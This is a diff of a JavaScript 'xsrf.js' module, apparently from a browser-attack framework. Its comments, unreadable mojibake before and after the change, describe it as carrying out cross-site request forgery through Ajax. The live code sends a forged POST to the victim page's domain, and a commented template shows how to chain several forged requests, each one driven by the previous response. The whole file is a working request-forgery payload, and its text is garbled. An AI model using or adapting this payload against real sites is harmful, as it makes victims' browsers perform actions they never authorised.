@@ -1,21 +1,21 @@
 //alert("xsrf.js");
 ////////////////////////////////////////////////
-// XSRF Ä£¿é,Í¨¹ı Ajax ÊµÊ©XSRF¹¥»÷
+// XSRF æ¨¡å—,é€šè¿‡ Ajax å®æ–½XSRFæ”»å‡»
 ////////////////////////////////////////////////
 
-/// ¿ªÊ¼Ö´ĞĞ¹¦ÄÜ
+/// å¼€å§‹æ‰§è¡ŒåŠŸèƒ½
 if (xmlhttp.init()) {
   ajaxpost("http://"+$d.domain, "");
   //ajaxget("http://"+$d.domain+"/fvck");
 }
 
 /////////////////////////////////////////////////////
-//// Èç¹ûĞèÒªÇ¶Ì×µ÷ÓÃ,±ÈÈçstep1->step2->step3
-//// ÔòĞèÒªÏñÈçÏÂµ÷ÓÃ
+//// å¦‚æœéœ€è¦åµŒå¥—è°ƒç”¨,æ¯”å¦‚step1->step2->step3
+//// åˆ™éœ€è¦åƒå¦‚ä¸‹è°ƒç”¨
 /*
 if (xmlhttp.init()) {
-	////// µÚÒ»¸ö°ü
-  // µÚ¶ş¸ö²ÎÊıÊÇÌá½»µÄ²ÎÊı,µÚÈı¸ö²ÎÊıÊÇheaders
+	////// ç¬¬ä¸€ä¸ªåŒ…
+  // ç¬¬äºŒä¸ªå‚æ•°æ˜¯æäº¤çš„å‚æ•°,ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯headers
 	xmlhttp.post("http://"+$d.domain, "", null, function(response, responseHeaders) {
 		if (responseHeaders != null) {
 			alert(responseHeaders);
@@ -25,7 +25,7 @@ if (xmlhttp.init()) {
 			alert(response);
 		}
 		
-		///// ¸ù¾İ·µ»Ø½á¹û´¦Àí,²¢Ìá½»µÚ¶ş¸ö°ü
+		///// æ ¹æ®è¿”å›ç»“æœå¤„ç†,å¹¶æäº¤ç¬¬äºŒä¸ªåŒ…
 		xmlhttp.post("http://"+$d.domain+"/fvck", "", null, function(response, responseHeaders) {
 		  if (responseHeaders != null) {
 			  alert(responseHeaders);
@@ -35,7 +35,7 @@ if (xmlhttp.init()) {
 			  alert(response);
 		  }
 		
-		  ///// ¸ù¾İ·µ»Ø½á¹û´¦Àí,²¢Ìá½»µÚÈı¸ö°ü
+		  ///// æ ¹æ®è¿”å›ç»“æœå¤„ç†,å¹¶æäº¤ç¬¬ä¸‰ä¸ªåŒ…
 		  ///////  ......  
      
 	  });    
